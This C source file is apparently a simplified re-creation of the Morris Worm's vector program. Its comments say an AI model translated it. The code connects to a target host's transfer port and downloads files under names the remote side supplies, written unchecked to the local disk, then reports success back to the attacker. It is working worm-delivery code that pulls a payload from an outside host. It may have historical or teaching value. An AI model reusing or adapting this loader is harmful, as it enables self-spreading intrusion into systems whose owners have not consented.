// Gemini translated version of the original vector program for the Morris Worm
// then simplified by me to only connect to target machine, pull files over
// and send confirmation back to attacker that files were created.

#include "worm.h"

int main(int argc, char *argv[]) {
    int sock = 0;
    struct sockaddr_in serv_addr;
    char io_buf[IO_BUF_SIZE];
    int len, n;
    FILE *fp;
    char filename[128];

    // Create socket and connect to the server
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        exit(1);
    }

    // Use TARGET_IP and a dedicated port for file transfer defined in worm.h
    create_sockaddr(&serv_addr, TARGET_IP, TRANSFER_PORT);

    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        perror("Connect failed");
        exit(1);
    }

    printf("Connected to server. Starting file transfer...\n");

    while (1) {
        // 1. Read the length of the incoming file (4-byte integer)
        if (read(sock, &len, 4) != 4) break;
        len = ntohl(len);

        // A length of -1 indicates the server has no more files to send
        if (len == -1) break;

        // 2. Read the filename (128 bytes)
        if (read(sock, filename, 128) != 128) break;

        printf("Downloading: %s (%d bytes)\n", filename, len);

        // 3. Open local file for writing
        fp = fopen(filename, "wb");
        if (fp == NULL) {
            perror("File open failed");
            break;
        }

        // 4. Download file content in chunks
        int remaining = len;
        while (remaining > 0) {
            n = read(sock, io_buf, (remaining > IO_BUF_SIZE) ? IO_BUF_SIZE : remaining);
            if (n <= 0) break;
            fwrite(io_buf, 1, n, fp);
            remaining -= n;
        }
        fclose(fp);

        // 5. Communicate success back to the server
        char *status = "SUCCESS\n";
        write(sock, status, strlen(status));
        printf("Successfully saved %s\n", filename);
    }

    printf("All transfers complete. Closing connection.\n");
    close(sock);
    return 0;
}